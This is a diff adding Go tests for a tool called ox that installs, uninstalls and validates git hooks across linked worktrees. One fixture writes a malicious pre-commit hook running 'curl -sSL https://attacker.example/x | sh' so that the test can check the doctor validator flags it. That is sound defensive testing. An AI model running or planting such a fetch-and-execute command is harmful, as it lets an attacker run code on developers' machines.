@@ -1,10 +1,13 @@
 package main
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
+	"github.com/sageox/ox/internal/uninstall"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
@@ -121,4 +124,107 @@ func TestInstallGitHooks_HooksPathAcrossWorktrees(t *testing.T) {
 func TestHooksDir_FallbackOutsideRepository(t *testing.T) {
 	root := t.TempDir()
 	assert.Equal(t, filepath.Join(root, ".git", "hooks"), resolveHooksDir(root))
+}
+
+// Failure prevented: `ox uninstall` reports success but leaves ox's git hooks
+// running in every checkout, because it looked in a linked worktree's .git
+// file or did not recognise the post-rewrite and pre-push sections.
+func TestRemoveHooks_RemovesEveryOxHookFromEitherCheckout(t *testing.T) {
+	skipIntegration(t) // Real git init, commit, and worktree creation.
+	origDryRun := uninstallDryRun
+	t.Cleanup(func() { uninstallDryRun = origDryRun })
+	uninstallDryRun = false
+
+	const userHook = "#!/bin/sh\n# user hook\nexit 0\n"
+	for _, tt := range []struct {
+		name         string
+		fromWorktree bool
+		userContent  bool
+	}{
+		{name: "main_ox_only"},
+		{name: "worktree_ox_only", fromWorktree: true},
+		{name: "worktree_user_content", fromWorktree: true, userContent: true},
+	} {
+		t.Run(tt.name, func(t *testing.T) {
+			mainRoot, worktreeRoot := gitHooksWorktree(t)
+			root := mainRoot
+			if tt.fromWorktree {
+				root = worktreeRoot
+			}
+			hooksDir := filepath.Join(mainRoot, ".git", "hooks")
+			if tt.userContent {
+				for _, spec := range allHookSpecs() {
+					require.NoError(t, os.WriteFile(filepath.Join(hooksDir, spec.name), []byte(userHook), 0755))
+				}
+			}
+			require.NoError(t, InstallGitHooks(root))
+
+			found, err := uninstall.FindSageoxHooks(root)
+			require.NoError(t, err)
+			var foundNames []string
+			for _, item := range found {
+				foundNames = append(foundNames, item.Name)
+			}
+			for _, spec := range allHookSpecs() {
+				assert.Contains(t, foundNames, spec.name, "uninstall must recognise every hook ox installs")
+			}
+
+			require.NoError(t, removeHooks(root))
+			for _, spec := range allHookSpecs() {
+				path := filepath.Join(hooksDir, spec.name)
+				if tt.userContent {
+					content, err := os.ReadFile(path)
+					require.NoError(t, err)
+					assert.Equal(t, userHook, string(content), spec.name)
+				} else {
+					assert.NoFileExists(t, path)
+				}
+			}
+			assert.Empty(t, oxHookSectionsPresent(t, mainRoot), "no ox section may survive uninstall")
+		})
+	}
+}
+
+// oxHookSectionsPresent returns the ox hooks whose start marker is still in
+// the shared hooks directory.
+func oxHookSectionsPresent(t *testing.T, mainRoot string) []string {
+	t.Helper()
+	var present []string
+	for _, spec := range allHookSpecs() {
+		content, err := os.ReadFile(filepath.Join(mainRoot, ".git", "hooks", spec.name))
+		if err == nil && strings.Contains(string(content), spec.markerStart) {
+			present = append(present, spec.name)
+		}
+	}
+	return present
+}
+
+// Failure prevented: from a linked worktree, doctor's hook-content check
+// reports clean without ever reading the hooks git runs for that worktree.
+func TestValidateInstalledHooks_LinkedWorktreeScansSharedHooks(t *testing.T) {
+	skipIntegration(t) // Real git init, commit, and worktree creation.
+	mainRoot, worktreeRoot := gitHooksWorktree(t)
+	hookPath := filepath.Join(mainRoot, ".git", "hooks", "pre-commit")
+	bad := "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n"
+	require.NoError(t, os.WriteFile(hookPath, []byte(bad), 0755))
+
+	findings, err := validateInstalledHooks(worktreeRoot)
+	require.NoError(t, err)
+	require.Len(t, findings, 1)
+	assert.Equal(t, hookPath, findings[0].Path, "a hook outside the worktree is shown by absolute path")
+	assert.NotEmpty(t, findings[0].Warnings)
+}
+
+// Failure prevented: doctor's "Git hooks" check skips with "read error" in
+// every linked worktree instead of reporting the hooks git runs there.
+func TestCheckGitHooks_LinkedWorktree(t *testing.T) {
+	skipIntegration(t) // Real git init, commit, and worktree creation.
+	mainRoot, worktreeRoot := gitHooksWorktree(t)
+	require.NoError(t, InstallGitHooks(mainRoot))
+	t.Chdir(worktreeRoot)
+
+	result := checkGitHooks()
+	assert.False(t, result.skipped, result.message)
+	assert.True(t, result.passed)
+	assert.Equal(t, fmt.Sprintf("%d active", len(allHookSpecs())), result.message)
 }
